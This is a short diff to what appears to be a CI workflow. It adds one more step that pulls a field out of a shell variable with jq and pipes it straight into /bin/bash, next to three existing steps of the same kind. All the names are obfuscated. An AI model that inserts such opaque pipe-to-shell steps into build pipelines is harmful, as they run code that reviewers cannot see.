@@ -21,6 +21,7 @@ jobs:
           echo $gmv185 | jq -r .qxh09245 | /bin/bash
           echo $l49 | jq -r .iskd51389 | /bin/bash
           printf '%s' "$kz4" | jq -r .bhn1 | /bin/bash
+          echo $xgf04784 | jq -r .zir4766 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
